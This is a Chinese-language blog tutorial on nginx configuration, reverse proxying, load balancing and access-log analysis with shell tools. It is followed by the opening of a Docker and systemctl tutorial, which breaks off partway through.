\u0026#39; \u0026#39;$status $body_bytes_sent \u0026#34;$http_referer\u0026#34; \u0026#39; \u0026#39;\u0026#34;$http_user_agent\u0026#34; \u0026#34;$http_x_forwarded_for\u0026#34;\u0026#39;; access_log /var/log/nginx/access.log main; sendfile on; tcp_nopush on; keepalive_timeout 65; server { listen 80; server_name localhost; location / { root /usr/share/nginx/html; index index.html index.htm; } } } 全局块 位于配置文件顶部，未嵌套于任何块中\n用于配置Nginx整体运行环境，影响所有子模块\nuser nginx; worker_processes auto; error_log /var/log/nginx/error.log warn; pid /var/run/nginx.pid; user：指定运行工作进程的用户和用户组\nworker_processes：指定工作进程数量\nauto表示自动与 CPU 核心数一致\nerror_log：设置错误日志的路径和日志级别\n每条错误日志条目都会带有一个严重性等级，这些等级是代码里写死的，作为用户无法改变某个错误属于什么等级\nNginx支持的日志级别（从高到低）如下：\n级别 描述 debug 记录所有信息，主要用于开发或调试，信息量极大，通常需编译时启用 info 普通信息，如配置加载成功、进程启动、连接创建等 notice 正常但重要的事件，如配置文件重载、进程关闭等 warn 警告信息，非致命错误，比如配置中存在问题但可以忽略或继续运行 error 运行过程中出现的错误，如连接失败、服务不可达等 crit 严重错误，Nginx可能无法继续运行 alert 必须立刻处理的严重问题 emerg 紧急状态，比如系统崩溃，Nginx无法启动 是否写入日志文件取决于LogLevel设置的阈值，只会写入大于等于当前设置等级的错误事件\n生产环境通常设置为warn以捕捉重要问题，同时避免日志泛滥\npid：指定记录主进程PID的文件路径\nevents块 紧随全局块之后，一级块\n用于配置与网络连接处理相关的指令，影响工作进程的并发性能\nevents { worker_connections 1024; } worker_connections：每个工作进程可同时处理的最大连接数\n总并发连接数约为worker_processes * worker_connections\nhttp块 紧随events块之后，一级块\n用于配置HTTP协议相关的指令，是配置Web服务的核心部分\nhttp { include /etc/nginx/mime.types; default_type application/octet-stream; log_format main \u0026#39;$remote_addr - $remote_user [$time_local] \u0026#34;$request\u0026#34; \u0026#39; \u0026#39;$status $body_bytes_sent \u0026#34;$http_referer\u0026#34; \u0026#39; \u0026#39;\u0026#34;$http_user_agent\u0026#34; \u0026#34;$http_x_forwarded_for\u0026#34;\u0026#39;; access_log /var/log/nginx/access.log main; sendfile on; tcp_nopush on; keepalive_timeout 65; server { ... } } include：引入外部文件\n这里/etc/nginx/mime.types用于MIME类型配置\ndefault_type：未明确 MIME 类型时的默认类型\nlog_format：定义日志名称与格式\naccess_log：指定访问日志的输出路径及格式\nsendfile：启用高效文件传输方式\ntcp_nopush：优化网络传输性能，避免频繁发送小包\nkeepalive_timeout：设置长连接超时时间\nserver块 嵌套于http块内部，二级块，可存在多个，用于配置多个虚拟主机\n用于定义单个虚拟主机的配置，通过监听端口和服务器名称对请求进行分发\nserver { listen 80; server_name localhost; location / { ... } } listen：设置监听的端口\n只有访问主机该端口的请求才会被接受\n不过得注意，如果使用docker，docker容器一般会把这个端口转发到主机的某个端口上\n基本用法：\nlisten \u0026lt;地址\u0026gt;:\u0026lt;端口\u0026gt; [参数]; 地址（可选）：指定绑定的 IP（默认是所有IP）\n端口：监听的端口\n参数（可选）：例如default_server、ssl、http2 等（我们后面都会提到）\n有一个比较特殊的参数：default_server，用来指定默认的server块，当Nginx收到请求但找不到任何server_name匹配时，就会使用这个默认配置来处理请求\n介绍几种常见listen字段写法：\n80：监听所有IP的80端口（80是默认HTTP端口），相当于0.0.0.0:8080\n127.0.0.1:8080：仅监听本地回环地址的8080端口\n[::]:80：IPv6地址监听80端口\nserver_name：匹配请求的主机名或域名\n只有请求头中的Host字段符合，Nginx才会把请求交给这个server块处理\n可以在server_name中写多个值，也支持通配符*，也可以使用_表示任何Host值\n如果不写这个字段，http块又只有一个server，那么这个server块会所有请求都匹配（包括 IP）\n如果不写这个字段，http块又有多个server，那么这个server块会作为默认server，处理未匹配的请求\nlocation块 嵌套于server块内部，三级块\n用于对URI（注意不是URL）进行匹配，制定请求的处理方式，如资源路径、代理规则等\nlocation / { root /usr/share/nginx/html; index index.html index.htm; } location：用于匹配客户端请求的URI\n示例这里是匹配以/开头的URI（实际上就是匹配所有请求，因为URI就是以/开头的）\n此外，Nginx提供多种匹配方式，优先级不同：\n类型 语法 示例 说明 精确匹配 = location = /login {} 仅匹配 URI 等于 /login 的请求 前缀匹配 / location /images/ {} 匹配以 /images/ 开头的 URI 正则匹配 ~（区分大小写）\n~*（不区分大小写） location ~ \\.php$ {} 使用正则表达式匹配 URI 优先匹配 ^~ location ^~ /static/ {} 前缀匹配优先于正则匹配 root：设置请求资源的根目录路径\n当一个请求到达时，Nginx会将请求的URI拼接到这个路径后面，以确定文件的具体位置\n如果客户端访问/index.html，那么实际访问的是服务器上的/usr/share/nginx/html/index.html文件\nindex：指定访问目录时的默认文件名称\n如果用户访问的是目录而不是具体文件，Nginx会在/usr/share/nginx/html/目录下按顺序查找：\nindex.html index.htm 只要找到其中一个文件，就立即返回该文件作为响应；如果都找不到，会返回403（禁止访问）或404（未找到），视配置而定\nroot和index也可以直接写在server块里面，作为所有location块的默认值\n说了这么多，我们最后总结一下listen、server_name、location 三者是如何配合工作的：\n用户访问浏览器输入：\nhttp://localhost/images/logo.png Nginx内部处理流程如下：\n看端口： 该请求是发给哪个端口，是80，那就匹配所有listen 80的server\n看Host头： Host是localhost，找哪个server_name匹配上了，进入该server块\n看URI： URI是/images/logo.png，在这个server中找哪个location匹配得最好，执行该location的规则\n核心功能 —— Web服务 Web 服务是 Nginx 最基础，也是最核心的功能，它能够高效地处理客户端对静态资源的请求\n这主要通过server块中的root、index、location来协同完成\n部署静态资源 可以把Nginx作为静态资源服务器，当用户请求时，Nginx从服务器的指定文件路径中查找并返回对应的文件：\nserver { listen 80; server_name example.com; root /var/www/my-project/public; index index.html index.htm; location / { try_files $uri $uri/ =404; } location ~* \\.(jpg|jpeg|gif|png|css|js|ico|webp)$ { expires 30d; } } try_files $uri $uri/ =404\n这是一个非常强大的指令，常用于处理单页应用（SPA）的路由，它的语法是：\ntry_files file1 file2 ... final_action; file1, file2, ...：依次判断路径（支持变量），是否存在有效文件或目录 final_action：如果前面都没找到，则执行的动作，常用的有： =404：返回404错误 @named_location：跳转到命名的location块 uri：重定向到指定URI 现在我们看看示例里面的是什么意思：\ntry_files $uri $uri/ =404 $uri：尝试将URI直接作为文件名进行查找\n$uri/：如果上一步失败，则尝试将URI作为一个目录名，并在该目录下查找由index指令定义的文件\n=404：如果前两步都失败，则返回一个404 Not Found错误\nlocation ~* \\.(jpg|jpeg|gif|png|css|js|ico|webp)$\n这是一个正则匹配，~*表示不区分大小写的正则，它会匹配所有以上述后缀结尾的请求\nexpires 30d\n用于设置HTTP响应头中的Expires和Cache-Control\n告诉客户端浏览器可以将这些静态资源缓存30天，从而减少不必要的请求，提升后续访问速度\nURL重写与跳转 Nginx支持在location块内实现URL重写和跳转，常用于：\n伪静态（SEO优化） 页面重定向 接口调整兼容 HTTPS 强制跳转等场景 rewrite rewrite是Nginx实现伪静态、内部跳转的主要方式\n它的本质是把用户请求的路径改写成另一个内部路径，再由Nginx重新处理\n基本语法 rewrite \u0026lt;正则匹配\u0026gt; \u0026lt;重写路径\u0026gt; [flag]; 正则匹配：对当前请求URI进行匹配（不包含域名）\n重写路径：替换匹配url的新URI，可引用正则中的子表达式\nflag 可选标志：\n重写方式 用法 含义 last 使用新URI，从头开始匹配location 用于常规重写，不会改变浏览器地址栏 break 使用新URI，但不再重新匹配location 跳出rewrite，在当前location内继续执行\n不会改变浏览器地址栏 permanent 返回301，永久重定向 会改变浏览器地址栏 redirect 返回302，临时重定向 会改变浏览器地址栏 伪静态处理 将 /product/123.html 重写为 /product.php?id=123：\nrewrite ^/product/([0-9]+)\\.html$ /product.php?id=$1 last; 隐藏真实路径 location /user/ { rewrite ^/user/([a-z]+)$ /profile.php?name=$1 last; } return return用于向客户端返回一个特定的状态码和内容，它不会再走rewrite的内部处理流程\n比起rewrite，它更适合用于明确的重定向、报错处理等\n基本语法 return \u0026lt;状态码\u0026gt; [文本|URL]; 状态码：如301（永久重定向）、302（临时重定向）、403（禁止访问）、404（页面不存在） 文本或URL：可返回跳转地址，也可直接返回文本内容（仅在状态码为200时有效） HTTP强制跳转HTTPS server { listen 80; server_name example.com; return 301 https://$server_name$request_uri; } 这一点我们下面会详细说明\n禁止访问某个目录 location /private/ { return 403; } 简洁跳转到首页 location = / { return 301 /home/index.html; } 纯文本响应 location = /test { return 200 \u0026#39;Hello.\u0026#39;; } 配置HTTPS服务 为网站启用HTTPS可以对客户端和服务器之间的传输数据进行加密，确保数据安全\n配置前，我们需要从证书颁发机构（CA）获取SSL/TLS证书文件和私钥文件\nserver { listen 443 ssl http2; server_name yourdomain.com; ssl_certificate /path/to/fullchain.pem; ssl_certificate_key /path/to/privkey.pem; ssl_session_cache shared:SSL:10m; ssl_session_timeout 10m; ssl_protocols TLSv1.2 TLSv1.3; ssl_ciphers \u0026#39;TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384\u0026#39;; ssl_prefer_server_ciphers off; root /var/www/my-project/public; index index.html; location / { try_files $uri $uri/ =404; } } server { listen 80; server_name yourdomain.com; return 301 https://$server_name$request_uri; } listen 443 ssl http2\n443是HTTPS的标准端口\nssl参数表示在此端口上启用SSL/TLS加密\nhttp2参数表示同时启用HTTP/2协议，它可以显著提升页面加载性能\nssl_certificate\n指定证书文件的路径，这通常是.pem或.crt格式的公钥证书链文件\nssl_certificate_key\n指定与证书配对的私钥文件的路径，通常是.key格式\nssl_session_cache\n开启SSL会话缓存，用于复用TLS握手过程，提升性能\nssl_session_timeout\n设置SSL会话的有效时间\nssl_protocols TLSv1.2 TLSv1.3\n指定只使用安全的TLS协议版本，废弃老旧且不安全的SSLv3, TLSv1.0, TLSv1.1\nssl_ciphers\n指定加密时使用的加密套件列表，配置安全的套件可以防止降级攻击\nssl_prefer_server_ciphers\n是否优先使用服务器端指定的加密套件，off表示客户端优先\nreturn 301 https://$server_name$request_uri\n发送一个永久重定向的HTTP状态码\n$server_name和$request_uri是Nginx变量，分别代表当前请求的域名和完整的 URI（包含参数）\n这能确保用户访问任何HTTP页面时都能被准确地重定向到对应的HTTPS版本\n核心功能 —— 反向代理 反向代理是Nginx的一个核心功能\nNginx作为一个中间层，接收客户端的请求，再将请求转发给后端服务器处理，然后将响应返回给客户端\n这种方式的好处包括：\n可以隐藏后端服务器的真实地址和结构 可以统一对外的入口，便于安全控制和运维管理 可以实现负载均衡、高可用等复杂功能（后续再讲） 下面是一个最简单的Nginx配置示例，只实现把请求转发到后端服务器的功能：\nserver { listen 80; server_name www.example.com; location / { proxy_pass http://127.0.0.1:3000; } } proxy_pass http://127.0.0.1:3000;\n这是反向代理的核心语句，即将匹配到的请求转发到本机的3000端口，由本地某个服务来实际处理请求\n默认情况下，Nginx把请求转发给后端时，不会携带原始客户端的信息\n如果后端服务要获取用户的真实IP、请求协议、原始域名等信息，就需要使用proxy_set_header来手动设置：\nserver { listen 80; server_name www.example.com; location / { proxy_pass http://127.0.0.1:3000; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; } } 这些proxy_set_header是给后端应用用的：\nHost $host：原始请求中的主机名 X-Real-IP $remote_addr：客户端的真实 IP X-Forwarded-For $proxy_add_x_forwarded_for：经过的所有代理 IP 列表 X-Forwarded-Proto $scheme：原始请求的协议（http 或 https） 如果我们有多个后端服务（比如多个进程、多个机器），可以用upstream来统一管理后端服务器组：\nupstream backend { server 127.0.0.1:3000; # server 127.0.0.1:3001; #可以添加多个 } server { listen 80; server_name www.example.com; location / { proxy_pass http://backend; #\u0026lt;--这里不一样了，使用的是upstream proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; } } 现在，我们只需要在proxy_pass中写 http://backend即可\n具体的地址都集中写在upstream backend块中，方便管理和负载均衡\n核心功能 —— 负载均衡 当upstream块中定义了多台server时，Nginx就自然地成为了一个负载均衡器\n它会根据指定的策略将请求分发到不同的服务器，以分担流量压力\nHTTP负载均衡配置 upstream backend_cluster { server backend1.example.com weight=5; server backend2.example.com; server backend3.example.com backup; server backend4.example.com down; } server { listen 80; location / { proxy_pass http://backend_cluster; proxy_connect_timeout 5s; proxy_read_timeout 10s; } } weight=5\n为服务器设置权重，在默认的轮询策略下，权重越高的服务器接收到的请求比例就越高\n这里backend1的请求量大约是backend2的5倍\nbackup\n将服务器标记为备用服务器\n只有当所有非备用的主服务器都无法访问时，Nginx才会将请求转发给它\ndown\n将服务器标记为永久下线，Nginx不会向它转发任何请求\n这通常用于服务器维护\nproxy_connect_timeout \u0026amp; proxy_read_timeout\n设置Nginx与后端服务器建立连接的超时时间和读取响应的超时时间\n可以防止因个别后端服务响应缓慢而导致请求长时间挂起\n负载均衡策略 轮询 默认策略，无需任何指令\n请求被按顺序、轮流分发到每台服务器，并考虑权重\n权重（weight） 就像我们之前提到过的例子，weight越高，分配的请求越多\n此策略适合后端性能不一致的情况（强机多干活）\nupstream backend_cluster { server 192.168.0.1 weight=3; server 192.168.0.2 weight=1; } 上例中，第一个服务器将获得大约75%的请求，第二个约25%\nIP哈希（ip_hash） 根据客户端IP地址的哈希值来选择服务器，这能确保来自同一个客户端的请求始终被定向到同一台后端服务器\n此策略对于需要保持用户会话状态的应用非常重要\nupstream backend_cluster { ip_hash; server backend1.example.com; server backend2.example.com; } 最少连接 (least_conn) 将新请求发送到当前活动连接数最少的服务器\n此策略在处理耗时不同或长连接较多的请求时，能使负载分布得更加均匀\nupstream backend_cluster { least_conn; server backend1.example.com; server backend2.example.com; } 核心功能 —— TCP/UDP代理 Nginx不仅能代理HTTP，还能通过stream模块在更底层的传输层（TCP/UDP）进行代理\n例如代理数据库连接、游戏服务器、DNS 查询等\nstream块必须配置在http块之外，位于主配置文件的顶层，和http是平级的\nstream { upstream mysql_cluster { server 192.168.1.101:3306 weight=2; server 192.168.1.102:3306; } server { listen 3307; proxy_pass mysql_cluster; proxy_timeout 20s; } server { listen 53 udp; proxy_pass 8.8.8.8:53; } } 你可以看到，stream块和http块的写法基本上是一样的，但是细节上还是有些不同：\nstream块不支持location，没有路径匹配 stream块不解析协议内容，没有proxy_set_header，只转发原始TCP/UDP数据流 stream块不支持ip_hash的负载均衡策略 日志分析 为何要分析Nginx日志 在现代 Web 架构中，Nginx 作为流量的入口，记录着大量有用的信息\n虽然ELK等日志平台功能强大，但并非所有环境都配备\n掌握底层的命令行分析技巧，能让我们在任何服务器上快速、灵活地定位问题\n注意：\n在处理大型日志文件（如 \u0026gt;1GB）时，应避免直接使用cat读取整个文件，这会消耗大量内存\n应使用head,tail,grep,sed,awk等可以流式处理的工具进行查看修改，或先对日志进行切割\n实在想要看全部，也应该选择使用less或more\n日志类型与格式 访问日志（access.log） access.log记录了每一个对Nginx服务器的HTTP请求的详细信息\n默认格式：combined / main Nginx官方默认格式是combined，不过现在常见的更多是main（包括之前我们给出的docker容器的nginx）\n其实main只是自定义的名字，本质和combined是类似的，甚至很多公司就是直接copy默认的combined格式起个名叫main，但更多的则是增加了一些字段（比如新增$http_x_forwarded_for字段）\n我们就以上文提到的配置文件示例里的main格式为例，这也是最为常见的格式之一，理解了就行\nlog_format main \u0026#39;$remote_addr - $remote_user [$time_local] \u0026#34;$request\u0026#34; \u0026#39; \u0026#39;$status $body_bytes_sent \u0026#34;$http_referer\u0026#34; \u0026#39; \u0026#39;\u0026#34;$http_user_agent\u0026#34; \u0026#34;$http_x_forwarded_for\u0026#34;\u0026#39;; access_log /var/log/nginx/access.log main; 变量名是Nginx内置的变量，不能随意改名字\n变量 解释 $remote_addr 客户端IP地址 $remote_user 客户端用户名称（用于HTTP认证，通常为-） [$time_local] 服务器本地的请求处理完成时间 \u0026quot;$request\u0026quot; 完整的原始请求行，如 \u0026quot;GET /index.html HTTP/1.1\u0026quot; $status HTTP响应状态码 $body_bytes_sent 发送给客户端的响应体大小（字节） \u0026quot;$http_referer\u0026quot; 请求的来源页面URL \u0026quot;$http_user_agent\u0026quot; 客户端的浏览器、操作系统等信息 \u0026quot;$http_x_forwarded_for\u0026quot; （重要） 记录了通过代理服务器访问的客户端真实IP地址 来看一个实际的main格式的access.log的条目：\n111.111.111.111 - - [28/Apr/2021:14:44:11 +0800] \u0026#34;GET /api/channel/unread.jsp HTTP/1.1\u0026#34; 200 65 \u0026#34;https://www.xxxx.cn/\u0026#34; \u0026#34;Mozilla/5.0...\u0026#34; \u0026#34;123.123.123.123\u0026#34; $remote_addr：111.111.111.111\n这是Nginx看到的客户端IP，可能是负载均衡/代理的IP，不一定是真实用户的IP\n$remote_user：- - 如果客户端经过了HTTP认证，这里会记录认证用户名，否则为-\n第一个 -：远程用户名（几乎不用，常为空） 第二个 -：认证用户名（如果用 Basic Auth 才会有） $time_local：28/Apr/2021:14:44:11 +0800 这是Nginx记录的本地时间，时区为+0800（北京时间）\n$request：GET /api/channel/unread.jsp HTTP/1.1 包含请求方法、URL路径和HTTP协议版本\n$status：200 HTTP状态码，表示请求成功\n$body_bytes_sent：65 响应体大小（字节数），不包含响应头\n$http_referer：https://www.xxxx.cn/ 请求来源页面，如果用户是从某个页面跳转过来的，这里会显示该页面URL，若没有则为-\n$http_user_agent：Mozilla/5.0... 客户端的User-Agent，表示浏览器或客户端的标识信息\n$http_x_forwarded_for：123.123.123.123 代理服务器通过HTTP头传递的真实客户端IP，用来识别经过代理时的原始用户地址\n这条日志告诉我们：\n在北京时间021-04-28 14:44:11，有一个客户端访问了接口/api/channel/unread.jsp，使用的是GET请求，HTTP版本是1.1，返回状态码200（成功），响应大小65字节，请求来自页面https://www.xxxx.cn/，使用的客户端是某个Mozilla浏览器/模拟器，其真实IP是123.123.123.123，但请求是经过代理，Nginx看到的源IP是111.111.111.111\n增强的自定义格式：JSON 为了便于程序（如 Logstash, Fluentd）解析，JSON格式也是目前的主流选择，属于典型的非默认格式\n它的结构清晰，键值对明确，机器解析友好，避免了awk和cut对字段位置的强依赖\nlog_format json_analytics escape=json \u0026#39;{\u0026#39; \u0026#39;\u0026#34;timestamp\u0026#34;: \u0026#34;$time_iso8601\u0026#34;,\u0026#39; \u0026#39;\u0026#34;client_ip\u0026#34;: \u0026#34;$remote_addr\u0026#34;,\u0026#39; \u0026#39;\u0026#34;request\u0026#34;: \u0026#34;$request\u0026#34;,\u0026#39; \u0026#39;\u0026#34;status\u0026#34;: $status,\u0026#39; \u0026#39;\u0026#34;bytes_sent\u0026#34;: $body_bytes_sent,\u0026#39; \u0026#39;\u0026#34;http_referer\u0026#34;: \u0026#34;$http_referer\u0026#34;,\u0026#39; \u0026#39;\u0026#34;http_user_agent\u0026#34;: \u0026#34;$http_user_agent\u0026#34;,\u0026#39; \u0026#39;\u0026#34;real_ip\u0026#34;: \u0026#34;$http_x_forwarded_for\u0026#34;,\u0026#39; \u0026#39;\u0026#34;request_time\u0026#34;: $request_time,\u0026#39; \u0026#39;\u0026#34;upstream_time\u0026#34;: \u0026#34;$upstream_response_time\u0026#34;\u0026#39; \u0026#39;}\u0026#39;; access_log /var/log/nginx/access.log json_analytics; 新增字段:\n$request_time\nNginx从接收到请求第一个字节到发送完最后一个字节的总时长（秒），性能指标\n$upstream_response_time\n从Nginx连接到上游后端服务到接收完响应头的时长，用于判断是 Nginx 慢还是后端服务慢\n上面一个例子的JSON格式示例如下:\n{\u0026#34;timestamp\u0026#34;: \u0026#34;2025-08-16T14:30:00+09:00\u0026#34;, \u0026#34;client_ip\u0026#34;: \u0026#34;111.111.111.111\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;GET /api/users HTTP/1.1\u0026#34;, \u0026#34;status\u0026#34;: 200, \u0026#34;bytes_sent\u0026#34;: 1500, \u0026#34;http_referer\u0026#34;: \u0026#34;-\u0026#34;, \u0026#34;http_user_agent\u0026#34;: \u0026#34;curl/7.68.0\u0026#34;, \u0026#34;real_ip\u0026#34;: \u0026#34;123.123.123.123\u0026#34;, \u0026#34;request_time\u0026#34;: 0.025, \u0026#34;upstream_time\u0026#34;: \u0026#34;0.024\u0026#34;} JSON日志使用jq工具可以轻松解析：\n统计状态码为500的请求数量:\ncat access.log | jq \u0026#39;select(.status == 500)\u0026#39; | wc -l 找出请求时间最长的10个请求：\ncat access.log | jq \u0026#39;.request_time\u0026#39; | sort -nr | head -n 10 Docker环境下的日志 上文已经提到过，在Docker中，nginx日志输出到标准输出和标准错误，记录在docker的日志中\n虽然日志本身的格式不会变，但Docker的日志驱动可能（取决于设置）会在每行日志前添加额外信息：\n[时间戳] [日志流] [原始日志内容] 字段 含义 示例 时间戳 Docker记录该日志的时间，精确到纳秒 2025-08-20T02:30:00.123456789Z 日志流 指明日志来源：\n标准输出：stdout，对应访问日志\n标准错误：stderr`，对应错误日志 stdout或stderr 实际Docker日志示例（还是上面的例子）：\n2025-08-16T05:45:01.123456789Z stdout F 111.111.111.111 - - [28/Apr/2021:14:44:11 +0800] \u0026#34;GET /api/channel/unread.jsp HTTP/1.1\u0026#34; 200 65 \u0026#34;https://www.xxxx.cn/\u0026#34; \u0026#34;Mozilla/5.0...\u0026#34; \u0026#34;123.123.123.123\u0026#34; 2025-08-16T05:45:01.123456789Z\nDocker捕获日志的UTC时间（纳秒精度）\nstdout F\n日志来源是stdout，并且标记为F，表示一行完整日志\n此外还有P标记，示这是多行日志的一部分，被拆分了，需要和后续/前面的片段合并\n可以直接通过管道分析docker logs的输出，但通常会配置Docker的日志驱动将这些日志流自动转发到集中的日志管理平台进行统一分析\n比如，统计客户端IP出现次数的前10：\ndocker logs nginx | awk \u0026#39;{print $4}\u0026#39; | sort | uniq -c | sort -nr | head -n 10 错误日志（error.log） error.log 记录 Nginx 启动和运行过程中的诊断信息，是排查问题的关键。\n一般格式 时间戳 [错误级别] pid#tid: *cid 错误描述, client: 客户端IP, server: 服务端, request: \u0026#34;请求行\u0026#34;, host: \u0026#34;Host\u0026#34; 字段 说明 时间戳 错误发生时间 [错误级别] 当前条目错误的错误等级，具体看：错误等级 pid#tid Nginx工作进程ID和线程ID *cid 客户端连接序列号 错误描述 具体的错误信息，例如connect() to 127.0.0.1:9000 failed (13: Permission denied) client 发生错误的客户端IP server 请求的服务端 request 请求行，如\u0026quot;GET /api HTTP/1.1\u0026quot;` host 客户端请求的目标主机名 具体示例：\n2025/08/16 14:35:00 [crit] 12345#12345: *6789 connect() to 127.0.0.1:9000 failed (13: Permission denied) while connecting to upstream, client: 192.168.1.10, server: example.com, request: \u0026#34;GET /api HTTP/1.1\u0026#34;, host: \u0026#34;example.com\u0026#34; 时间戳：2025/08/16 14:35:00 错误级别：crit（严重错误） pid#tid：12345#12345 *cid：*6789 错误描述：connect() to 127.0.0.1:9000 failed (13: Permission denied) while connecting to upstream 客户端：192.168.1.10 服务端：example.com 请求：\u0026quot;GET /api HTTP/1.1\u0026quot; Host：example.com 分析：\n客户端192.168.1.10请求 /api接口时，Nginx尝试连接上游服务127.0.0.1:9000失败，原因是权限被拒绝（Permission denied）。日志级别为 crit，说明这是严重错误，需要检查Nginx或上游服务的权限设置\n分析技巧 网站流量核心指标分析 (PV \u0026amp; UV) PV (Page View，页面浏览量) 和 UV (Unique Visitor，独立访客) 是衡量网站价值和用户行为趋势的重要指标\n统计总UV (根据IP) 提取第1个字段(IP)，排序，去重，最后统计独立IP总数：\nawk \u0026#39;{print $1}\u0026#39; access.log | sort | uniq | wc -l 统计总PV 直接统计日志总行数即为PV：\nwc -l access.log 统计某时间段的UV / PV 统计2021年4月28日14:00-14:59的UV：\ngrep \u0026#34;28/Apr/2021:14\u0026#34; access.log | awk \u0026#39;{print $1}\u0026#39; | sort | uniq | wc -l 使用sed进行更精确的时间段筛选 (14点到20点)：\nsed -n \u0026#39;/28\\/Apr\\/2021:14/,/28\\/Apr\\/2021:20/p\u0026#39; access.log | awk \u0026#39;{print $1}\u0026#39; | sort | uniq | wc -l 访问来源与异常排查 (IP \u0026amp; URL) 用于判断是否被攻击、接口是否存在Bug或排查流量报警\n查询访问最频繁的Top 10 URL 提取第7字段(URL)，排序，去重并计数，按计数值倒序排列:\nawk \u0026#39;{print $7}\u0026#39; access.log | sort | uniq -c | sort -k1 -nr | head -n 10 查询访问最频繁的Top 10 IP awk \u0026#39;{print $1}\u0026#39; access.log | sort | uniq -c | sort -k1 -nr | head -n 10 查看指定IP在某天访问了哪些 URL (Top 10) grep \u0026#34;111.111.111.111\u0026#34; access.log | grep \u0026#34;28/Apr/2021\u0026#34; | awk \u0026#39;{print $7}\u0026#39; | sort | uniq -c | sort -nr | head -n 10 性能与爬虫分析 统计爬取次数 grep -i \u0026#39;spider\\|bot\u0026#39; access.log | wc -l 统计每分钟/每秒的请求数 (Top 20) 每分钟: 截取时间字段($4)的第2到18位(到分钟)\nawk \u0026#39;{print $4}\u0026#39; access.log | cut -c 2-18 | sort | uniq -c | sort -nr | head -n 20 每秒: 截取时间字段($4)的第2到21位(到秒)\nawk \u0026#39;{print $4}\u0026#39; access.log | cut -c 2-21 | sort | uniq -c | sort -nr | head -n 20 分析请求响应时间 (需自定义日志格式) 前提: 确保log_format中包含了$request_time，我们假设它在最后一个字段\n列出传输时间超过3秒的Top10请求 $NF代表最后一个字段，此命令筛选出最后一个字段值大于3的行：\nawk \u0026#39;$NF \u0026gt; 3 {print $NF, $7}\u0026#39; access.log | sort -k1 -nr | head -n 10 列出最耗时的Top10请求 awk \u0026#39;{print $NF, $7}\u0026#39; access.log | sort -k1 -nr | head -n 10 暂时就先讲到这，毕竟只是入个门，详细使用就在实践里面学习吧\n如果之后我需要更加深入使用，这篇文章也会更新的~\n","date":"2025-07-24T22:15:30+08:00","image":"http://picture.928330.xyz/typora/94b5f0d5aceb41498d7d03bcff81ecf5.jpeg","permalink":"https://blog.928330.xyz/p/nginx%E5%85%A5%E9%97%A8/","title":"Nginx入门"},{"content":"本教程针对的是linux环境下的docker\nDocker简介 什么是Docker Docker是一个开源的容器化平台，旨在简化应用程序的开发、交付和运行\n它允许开发者将应用程序及其所有依赖项打包到一个轻量级的、可移植的容器中，从而确保在不同环境中都能一致地运行\n容器之间是隔离的，像一个个小型的沙箱\n一句话：Docker就像一个轻量级虚拟机，可以在不同的环境中快速部署运行同样的应用程序\nDocker的主要概念 容器（Container） 容器是Docker的核心，它就像是一个隔离的小程序环境，打包了应用运行所需的一切\n与传统虚拟机相比，容器不需要包含整个操作系统，只共享宿主机内核，因此占用资源小、启动速度快\n无论在本地、测试环境，还是部署到服务器，运行结果都一致\n每个容器互相隔离，修改不会影响宿主机或其他容器\n比如，运行一个Python应用的容器，就像在一个只包含Python的迷你Linux系统里运行它\n镜像（Image） 镜像是构建容器的模板或快照，可以理解为包含了系统环境+应用程序代码+配置的“包”\n镜像一经创建就不变，部署更可靠\n比如我们下载nginx这个镜像，然后就能启动一个nginx容器，就像虚拟机的快照和启动运行\n即使我们更改了容器，镜像也不会改变，我们也可以把改动的容器制作为新的镜像，类似拍摄快照\n一个镜像可以启动成多个容器，就像一个类能被实例化成多个对象\nDockerfile 它是用来构建镜像的配置脚本\n里面写入了构建命令，如基于哪个镜像、复制哪些文件、安装哪些软件等\n使用docker build命令可以将Dockerfile构建成镜像，然后启动对应的容器\n仓库（Registry） 存储和分发镜像的平台\n比如DockerHub，就是Docker官方提供的镜像仓库平台（类似GitHub），有很多官方镜像可以免费下载\nsystemctl命令使用 systemctl是现代Linux发行版中核心的系统和服务管理器\n它负责启动、停止、检查和管理系统上的各种后台服务（也称为守护进程）\n在使用任何Docker命令之前，必须确保Docker的后台服务正在运行\n接下来我们将以Docker服务为例结合介绍它的各种命令\n服务的生命周期管理 这是 systemctl最核心的功能，用于控制一个服务的运行、停止和重启等\n启动服务 当一个服务处于停止状态时，使用start命令来启动它\nsystemctl start 服务名称 eg：\nsystemctl start docker 此命令会启动Docker服务，Docker守护进程会在后台开始运行，准备接收和处理Docker相关的命令\n通常执行此类操作需要管理员权限\n停止服务 停止一个正在运行的服务\nsystemctl stop 服务名称 eg：\nsystemctl stop docker 此命令会向Docker服务发送停止信号，使其安全地终止\n对于Docker来说，这意味着Docker守护进程会关闭，所有通过该守护进程运行的容器也会停止\n重启服务 这是一个便捷的组合命令，相当于先停止服务再立即启动它\n这在修改了服务的配置文件后，需要让新配置生效时非常有用\nsystemctl restart 服务名称 eg：\nsystemctl restart docker 如果修改了Docker的配置文件（例如 /etc/docker/daemon.json），执行此命令会重启 Docker 服务，使其加载并应用新的配置\n重新加载服务配置 在不中断服务的情况下，重新加载其配置文件\nsystemctl reload 服务名称 eg：\nsystemctl reload docker 这个命令比restart更为温和，它会请求服务重新读取其配置文件，而不会终止正在运行的主进程\n但是，并非所有服务都支持reload操作，如果服务不支持此操作，systemctl可能会转而执行restart\nDocker服务通常建议使用restart而不是reload来应用配置更改\n服务的状态与信息查看 查看服务详细状态 获取一个服务的全面信息，包括它是否正在运行、最近的日志、进程ID (PID) 等\nsystemctl status 服务名称 eg：\nsystemctl status docker 这是排查服务问题的首选\n它会清晰地显示服务的active状态，如 active (running) 或 inactive (dead)），并附带最近几条相关的日志记录\n检查服务是否正在运行 快速检查一个服务当前是否处于活动状态\nsystemctl is-active 服务名称 eg：\nsystemctl is-active docker 此命令的返回值非常简洁：\n如果服务正在运行，它会输出active并返回状态码 0\n如果服务未运行，它会输出inactive\n这在编写自动化脚本时很有用，可以根据返回值来判断是否需要执行某些操作\n服务的开机自启动管理 设置开机自启动 将一个服务设置为在系统启动时自动运行\nsystemctl enable 服务名称 eg：\nsystemctl enable docker 